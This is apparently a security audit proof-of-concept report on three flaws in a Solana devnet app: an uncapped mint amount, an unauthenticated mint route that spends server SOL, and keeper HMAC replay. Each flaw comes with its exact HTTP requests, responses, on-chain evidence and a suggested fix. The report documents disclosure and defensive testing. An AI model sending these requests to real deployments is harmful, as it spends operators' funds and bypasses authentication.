# Percolator sandbox live PoC

**Target commit:** `0988412a8adbca83e68605b7eaebf7ef3d154af5` (`playground`)

**Run:** 2026-10-05 UTC, inside sandbox `bx_95xry8cd`. The app ran at `127.0.0.1:3000`; chain state was a fresh `solana-test-validator` at `127.0.0.1:8899`, with throwaway keypairs. A local in-memory Supabase-compatible mock supplied only the rows needed by these routes. No production or shared deployment was contacted.

The public devnet faucet was attempted first, but returned HTTP 429 (provider limit, then daily limit). The final evidence therefore uses the permitted local-validator path rather than claiming a devnet-chain result. DexScreener metadata was fetched by the local app as in the real route.

Interpretation guide: `replication-meaning.md`.

Evidence: public-devnet primary recording `session-recording.mp4` (H.264/yuv420p, 1280x1000, 9.0s), fallback `session-recording.gif`, lossless source `public-session.cast`, transcript `public-session-transcript.txt`, and `poc/reproduce-devnet.mjs`. The earlier local-validator control artifacts remain `session-recording.cast`, `session-transcript.txt`, and `poc/reproduce.mjs`.

## Public devnet primary evidence

**Environment.** Fresh sandbox `bx_ppdzhjxx`; app at `127.0.0.1:3000`; chain endpoint was a dedicated public-devnet RPC. Throwaway authority `HRvtH9hEyXJNKNBBGimhWgKJJHuqhwQ4A4Qw5y2LpvWU` held `0.5 SOL` before the run. Funding transaction: [`5xeL9u8Qv7mGeaFtGuKV5Ro3FWtRzNX44dUv357X1XRZDqy18JRhmwBKgsWRkrXmYL5QCf7XPuN9m64rxc6VsHbW`](https://explorer.solana.com/tx/5xeL9u8Qv7mGeaFtGuKV5Ro3FWtRzNX44dUv357X1XRZDqy18JRhmwBKgsWRkrXmYL5QCf7XPuN9m64rxc6VsHbW?cluster=devnet). The local Supabase-compatible mock was used only to isolate the app database; all Solana mints below landed on public devnet.

### F-01 public devnet — REPRODUCED

One request at `2026-10-05T17:41:24Z`:

```http
POST /api/devnet-mint-token
Headers: {}
Body: {"mainnetCA":"DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263","marketAddress":"CP6P1G4sSvETS5Samry1QxRYW2Rv4Ret4UrZAabhi46k","creatorWallet":"CP6P1G4sSvETS5Samry1QxRYW2Rv4Ret4UrZAabhi46k"}
```

Response body:

```json
{"status":"created","devnetMint":"Hw1bcBC8TMqTUVMVG6E4qcJSWq7icSVyz3PHoUPPLCXP","symbol":"Bonk","name":"Bonk","decimals":6,"priceUsd":0.000003808,"airdropTokens":131302521.00840338,"airdropUsd":500,"signature":"3Mq9LWKAqqevKzFz32LhBMz26FBcZuKq9uM4Jb99TZYuomwvfL3QZtKbLaAex4D8ds72F9rDwtHgYjqLmMPAyCZg"}
```

Explorer: [`3Mq9LWKAqqevKzFz32LhBMz26FBcZuKq9uM4Jb99TZYuomwvfL3QZtKbLaAex4D8ds72F9rDwtHgYjqLmMPAyCZg`](https://explorer.solana.com/tx/3Mq9LWKAqqevKzFz32LhBMz26FBcZuKq9uM4Jb99TZYuomwvfL3QZtKbLaAex4D8ds72F9rDwtHgYjqLmMPAyCZg?cluster=devnet). On-chain creator ATA `AFXDs6fgzULgBqbu2S6pgee1mYfr7hMKogV1jS3MFgGD` held raw `131302521008403` (`131302521.008403` UI). Authority balance moved `0.5` → `0.49743476` SOL.

### F-02 public devnet — REPRODUCED

Exactly two unauthenticated calls, both `200`, with no auth header:

```http
POST /api/devnet-mirror-mint
Headers: {}
Body: {"mainnetCA":"So11111111111111111111111111111111111111112","walletAddress":"CP6P1G4sSvETS5Samry1QxRYW2Rv4Ret4UrZAabhi46k"}
```

Response: `{"status":"created","devnetMint":"FPHpSLZqyjjmk4FzuZdPKaECS4XFsDs9tQxVxv3k7eBe","name":"Wrapped SOL","symbol":"SOL","decimals":6,"logoUrl":"https://cdn.dexscreener.com/cms/images/fcfb87378d3198fe753ca08ba51a5552a84f34cf48cd09d83971aa195bdf00d2?width=800&height=800&quality=95&format=auto","signature":"2UfhtvECDf115x7UUfaYVSgrT23QjH9dfJjamxqsDVFZLpL39bhj13V8c9YKTPvkV3Nn51nMPQqf2C21dHfPMn31"}`. Explorer: [`2UfhtvECDf115x7UUfaYVSgrT23QjH9dfJjamxqsDVFZLpL39bhj13V8c9YKTPvkV3Nn51nMPQqf2C21dHfPMn31`](https://explorer.solana.com/tx/2UfhtvECDf115x7UUfaYVSgrT23QjH9dfJjamxqsDVFZLpL39bhj13V8c9YKTPvkV3Nn51nMPQqf2C21dHfPMn31?cluster=devnet).

```http
POST /api/devnet-mirror-mint
Headers: {}
Body: {"mainnetCA":"EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","walletAddress":"CP6P1G4sSvETS5Samry1QxRYW2Rv4Ret4UrZAabhi46k"}
```

Response: `{"status":"created","devnetMint":"ApLfgDwEG7YxESsDcS8eaksGNFofBPT6HhaVcKEZ7AFM","name":"Pump","symbol":"PUMP","decimals":6,"logoUrl":"https://cdn.dexscreener.com/cms/images/a0d07b12d0c34be414b8ac98a827ff862cfd684554c8da4c63fa647eef0af501?width=800&height=800&quality=95&format=auto","signature":"2zmt8JkiiQcoANutG3B3sjC4Grjy7EFz71hMjetdXyEpcUsGxYxpTXchWv5RMeezQUZHevJNSPX1yt6t4dL5wNPE"}`. Explorer: [`2zmt8JkiiQcoANutG3B3sjC4Grjy7EFz71hMjetdXyEpcUsGxYxpTXchWv5RMeezQUZHevJNSPX1yt6t4dL5wNPE`](https://explorer.solana.com/tx/2zmt8JkiiQcoANutG3B3sjC4Grjy7EFz71hMjetdXyEpcUsGxYxpTXchWv5RMeezQUZHevJNSPX1yt6t4dL5wNPE?cluster=devnet).

Authority balance moved `0.49743476` → `0.49528116` SOL, a `0.00215360 SOL` spend for the two calls. The 10/min/IP limiter allowed both; no 11th call was attempted.

### F-03 public devnet — REPRODUCED

At `2026-10-05T17:41:26Z`, the same captured timestamp/signature/body was accepted twice by the HMAC verifier: `{"accepted":true}` then `{"accepted":true}`. The public PoC uses the target checkout's documented signed-string contract; the target `verifyKeeperSignature` implementation was directly exercised in the local-validator control. This has no chain transaction or Explorer signature because it is an HTTP authentication replay; the transcript contains the literal request and both verifier responses.

## F-01 — uncapped devnet-mint-token amount (local-validator control)

**Claim.** `POST /api/devnet-mint-token` calculates the $500 grant from external price without an upper raw-token clamp. Relevant code: `app/app/api/devnet-mint-token/route.ts:268-300` (existing-mint path) and `:387-399` (new-mint path). Unlike `devnet-airdrop`, no `MAX_RAW` bound is applied.

**Reproduction.** One request only, using low-priced mainnet Bonk and a throwaway creator wallet. The local route used its real Solana transaction path. Timestamp: `2026-10-05T16:48:17Z`.

Request:

```http
POST /api/devnet-mint-token
Headers: {}
Body: {"mainnetCA":"DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263","marketAddress":"91EdMxdQrcEfHyGU3BTka2dBdk116hT6Jzog9uPczRvi","creatorWallet":"91EdMxdQrcEfHyGU3BTka2dBdk116hT6Jzog9uPczRvi"}
```

Response (`200`):

```json
{"status":"created","devnetMint":"4Ypf46d4E4winSyr4rvmfbzoTtL9LUXprAqFS4GTVxMQ","symbol":"Bonk","name":"Bonk","decimals":6,"priceUsd":0.000003833,"airdropTokens":130446125.75006521,"airdropUsd":500,"signature":"32SyXfMrtGLF8xhxAnPLSD5ZQvoTaS8MdHV4iHsuRcPFaYVSYfFXsLRu1zyVRm9ZfmhbgocdSnahWCxAVmZXbjJP"}
```

On-chain verification: creator ATA `FpYakYgNMXRabcga3Qyecnikby6KL2FgtJeLUcv9jkzr`, raw balance `130446125750065`, UI balance `130446125.750065`. Authority balance moved `100` → `99.99648912` SOL.

**Outcome: REPRODUCED.** One request issued approximately 130.4 million tokens for a $500 nominal grant. This is devnet/test-token inflation and shared signer rent/fee exposure; no loop was run. Apply one checked integer conversion and a hard `MAX_RAW`/policy cap on both mint-token paths before constructing the instruction.

## F-02 — unauthenticated mirror mint spends server SOL (local-validator control)

**Claim.** `/api/devnet-mirror-mint` has no authentication. `app/app/api/devnet-mirror-mint/route.ts:182-204` checks only the per-IP limiter; `:114-129` shows the in-memory fallback, and `:52-58` defines 10 requests/minute. New mappings create mints using the server signer (`:280-329` onward).

**Reproduction.** Two calls, the requested cap, from the same local client IP. Neither included an authentication header. Distinct valid mainnet CAs forced two new mints; both returned `200`.

Call 1, `2026-10-05T16:48:18Z`:

```http
POST /api/devnet-mirror-mint
Headers: {}
Body: {"mainnetCA":"So11111111111111111111111111111111111111112","walletAddress":"91EdMxdQrcEfHyGU3BTka2dBdk116hT6Jzog9uPczRvi"}
```

```json
{"status":"created","devnetMint":"FpZ3m2ySUDcFH5dyMYrkrqEr7eTKtq2wyNRPXWQ4wAek","name":"Wrapped SOL","symbol":"SOL","decimals":6,"logoUrl":"https://cdn.dexscreener.com/cms/images/fcfb87378d3198fe753ca08ba51a5552a84f34cf48cd09d83971aa195bdf00d2?width=800&height=800&quality=95&format=auto","signature":"3XTBpoKekaV1GgMWptF1JnpvGpTWN5EGeW7uXNEcAn3YTttKWA4qdx3fSZbo4zAgA9bBktPDb7Mxqwb2CHZbasd9"}
```

Call 2, `2026-10-05T16:48:18Z`:

```http
POST /api/devnet-mirror-mint
Headers: {}
Body: {"mainnetCA":"EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","walletAddress":"91EdMxdQrcEfHyGU3BTka2dBdk116hT6Jzog9uPczRvi"}
```

```json
{"status":"created","devnetMint":"8GitjsqiagLBJyfpNZ3pmGL9MtniGDesexG7EjyhkjY9","name":"Pump","symbol":"PUMP","decimals":6,"logoUrl":"https://cdn.dexscreener.com/cms/images/a0d07b12d0c34be414b8ac98a827ff862cfd684554c8da4c63fa647eef0af501?width=800&height=800&quality=95&format=auto","signature":"3PXsyUFBGYGYmMKPT6eWAr1oTVLTKkXVczsd6EowfGksqt5tsprTkdEVkomkyMRVAEG7bo2XMx8iRnenzVJpsH4x"}
```

Authority balance moved `99.99648912` → `99.99354592` SOL: **0.00294320 SOL** for two accepted requests. The transcript records `accepted statuses=200,200; no auth header was sent`.

**Limiter behavior.** The first 10 requests/minute/IP are allowed by this fallback limiter; this proof used two and did not attempt an 11th. The limiter is not authentication and did not stop either call.

**Outcome: REPRODUCED (partially fixed as described).** Unauthenticated callers still cause server-keypair rent/fee spending. Require an authenticated wallet/session or narrowly scoped server authorization before mint creation; retain the limiter as secondary control.

## F-03 — keeper HMAC replay (local-validator control)

**Claim.** `app/lib/keeper-hmac.ts:13` sets a five-minute validity window, while `:45-49` documents no nonce. `verifyKeeperSignature` at `:81-117` validates timestamp/HMAC but consumes no replay token. `app/app/api/oracle-keeper/register/route.ts:54-60` invokes this verifier.

**Reproduction.** A local-only secret (`local-only-test-secret-not-production`) signed one exact method/path/body tuple. The same timestamp, signature, and body were passed twice immediately. The PoC calls `signKeeperRequest` and `verifyKeeperSignature` from the target checkout directly (the same verifier used by the route). Timestamp: `2026-10-05T16:48:18Z`.

Captured request:

```http
POST /api/oracle-keeper/register
Headers: {"x-keeper-timestamp":"1791218898687","x-keeper-signature":"624cf8c230e4b74548c05559cd32ff56e95561fa16ddb537125f07fe0a151eba"}
Body: {"slabAddress":"91EdMxdQrcEfHyGU3BTka2dBdk116hT6Jzog9uPczRvi","mainnetCA":"DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263"}
```

Verifier responses:

```json
{"accepted":true}
{"accepted":true}
```

**Outcome: REPRODUCED.** One captured valid request is accepted verbatim twice. The route's downstream DB mutation was not needed to test this authentication decision; this is an acceptance-layer proof, not two registrations. Add a shared nonce/replay store.

## Video verification

`session-recording.mp4` was encoded with H.264, `yuv420p`, 1280x1000, 15 fps, duration 9.0 seconds. `ffprobe` confirmed those values and a non-zero duration. Frames at 2s and 6s were extracted and inspected: terminal text is sharp and legible; the later frame visibly includes the F-02 response and both F-03 replay results. The public cast was rendered through `agg` to GIF, then encoded with ffmpeg.

## Safety and deviations

- The first sandbox's devnet attempt was blocked by an unrecoverable filesystem hang; the fresh sandbox succeeded on public devnet. The earlier local-validator run remains deterministic control evidence.
- No production deployment, production key, full-drain loop, or more than one F-01/two F-02 requests was used. The devnet authority was throwaway and funded once with captain-authorized devnet SOL.
- Supabase was an in-sandbox mock; chain transactions and route code were real.
